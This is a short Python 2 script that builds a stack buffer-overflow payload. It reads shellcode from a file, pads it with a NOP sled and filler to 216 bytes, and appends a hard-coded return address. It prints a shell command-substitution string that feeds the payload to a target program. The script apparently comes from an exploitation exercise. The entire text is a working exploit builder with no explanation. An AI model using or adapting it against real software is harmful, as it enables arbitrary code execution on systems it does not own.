#!/usr/bin/python2

import sys

shellcode = ""
count   = 0
payload = ""
payload2 = ""

file = open(sys.argv[1], 'rb')

for byte in file.read():
    shellcode += "\\x" + byte.encode("hex")
    count += 1

z=216-count
x=z//8
y=z%8

payload += "\\x90"*(x*8)
payload += shellcode
payload += "A"*y
payload += "\\x10\\xdd\\xff\\xff\\xff\\x7f"

payload2 += shellcode
payload2 += "A"*(216-count)
payload2 += "\\x10\\xdd\\xff\\xff\\xff\\x7f"

print("\"$(python -c 'print \"" + payload2 + "\"')\"")
